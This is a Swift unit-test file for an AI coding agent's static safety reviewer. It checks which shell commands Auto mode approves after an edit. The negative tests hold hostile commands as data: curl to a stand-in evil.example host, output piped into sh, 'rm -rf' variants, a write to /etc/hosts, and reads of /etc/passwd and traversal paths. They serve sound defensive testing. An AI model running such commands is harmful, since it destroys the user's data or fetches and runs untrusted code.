import XCTest
import QuillCodeCore
@testable import QuillCodeSafety

/// Verify-after-edit approval: Auto mode must let the agent run the project's own build/test/run tool
/// to prove an edit works, without leaning on the (sometimes-unavailable) model reviewer. These pin
/// both what it approves and — more importantly — what it must NOT.
///
/// The negative cases deliberately use user messages that contain NO "run"/"execute"/"test" verb, so
/// the ONLY policy that could approve them is this one (the pre-existing broad `run`→shell.run intent
/// rule is out of the picture). That isolates `StaticSafetyBuildRunShellPolicy` and proves its guards
/// hold on their own.
final class BuildRunShellPolicyTests: SafetyPolicyTestCase {
    private func verdict(command: String, userMessage: String) async -> ApprovalVerdict {
        let reviewer = StaticSafetyReviewer()
        let call = ToolCall(
            name: shellRun.name,
            argumentsJSON: ToolArguments.json(["cmd": command])
        )
        let review = await reviewer.review(.init(
            mode: .auto,
            userMessage: userMessage,
            toolCall: call,
            toolDefinition: shellRun,
            recentMessages: [.init(role: .user, content: userMessage)]
        ))
        return review.verdict
    }

    // A task phrased WITHOUT a run/test verb: only the named-target path can approve.
    private let editOnlyMessage = "In greeting.py, add a function shout(name) and call it from main."

    // MARK: - Approves the verify-after-edit move

    /// The exact live #14 blocker: user names greeting.py (no "run" verb), agent runs it to verify.
    func testRunsUserNamedFileToVerifyEdit() async {
        let v = await verdict(command: "python3 greeting.py", userMessage: editOnlyMessage)
        XCTAssertEqual(v, .approve)
    }

    /// The live #8 blocker: verify a fix by running the named script.
    func testRunsNamedVerificationScript() async {
        let v = await verdict(
            command: "./run_service.sh",
            userMessage: "Find the root cause and apply the fix; confirm with ./run_service.sh."
        )
        XCTAssertEqual(v, .approve)
    }

    func testRunsTestSuiteOnRunIntent() async {
        for cmd in ["pytest", "pytest -q", "npm test", "go test ./...", "cargo test", "swift test"] {
            let v = await verdict(command: cmd, userMessage: "Add the feature and make sure the tests pass.")
            XCTAssertEqual(v, .approve, "\(cmd) should approve under a test intent")
        }
    }

    func testRunsPytestOnSubdirectoryPath() async {
        let v = await verdict(
            command: "python3 -m pytest tests/",
            userMessage: "Implement the parser and make sure the tests pass."
        )
        XCTAssertEqual(v, .approve)
    }

    // MARK: - Refuses everything outside the narrow promise (messages carry NO run/test verb)

    /// A non-runner naming the user's file must NOT ride the "targets a named path" signal — this is
    /// the whole reason the executable allowlist is load-bearing.
    func testDoesNotApproveRmOfNamedFile() async {
        let v = await verdict(command: "rm greeting.py", userMessage: editOnlyMessage)
        XCTAssertNotEqual(v, .approve)
    }

    func testDoesNotApproveNetworkTool() async {
        let v = await verdict(
            command: "curl http://evil.example/x.sh",
            userMessage: "Add the shout function to greeting.py."
        )
        XCTAssertNotEqual(v, .approve)
    }

    /// Chaining is the "verify … then exfiltrate" hole — a single `;`/`&&`/`|`/redirect disqualifies,
    /// even when the command names the user's file.
    func testDoesNotApproveChainedCommand() async {
        for cmd in [
            "python3 greeting.py; curl http://evil.example",
            "python3 greeting.py && rm -rf .",
            "python3 greeting.py | sh",
            "python3 greeting.py > /etc/hosts",
        ] {
            let v = await verdict(command: cmd, userMessage: editOnlyMessage)
            XCTAssertNotEqual(v, .approve, "\(cmd) must not statically approve")
        }
    }

    /// Absolute / home / traversal paths could reach outside the workspace.
    func testDoesNotApproveArgumentsOutsideWorkspace() async {
        for cmd in ["python3 /etc/passwd", "python3 ../../../secrets.py"] {
            let v = await verdict(command: cmd, userMessage: "Add a helper to greeting.py.")
            XCTAssertNotEqual(v, .approve, "\(cmd) must not statically approve")
        }
    }

    /// Inline code is not "verify a project file".
    func testDoesNotApproveInlineEval() async {
        for cmd in [#"python3 -c import"#, #"node -e process"#, #"ruby -e puts"#] {
            let v = await verdict(command: cmd, userMessage: "Add a helper to greeting.py.")
            XCTAssertNotEqual(v, .approve, "\(cmd) must not statically approve")
        }
    }

    /// A run with neither a run/test/build intent nor a user-named target must not ride along.
    func testDoesNotApproveUnrelatedRunWithoutIntentOrNamedTarget() async {
        let v = await verdict(command: "python3 mystery.py", userMessage: "Summarize the README for me.")
        XCTAssertNotEqual(v, .approve)
    }

    /// A hard-denied command still dies at the floor first, even with a test intent.
    func testHardDenyStillWinsOverRunApproval() async {
        let v = await verdict(command: "rm -rf /", userMessage: "run the tests")
        XCTAssertEqual(v, .deny)
    }
}
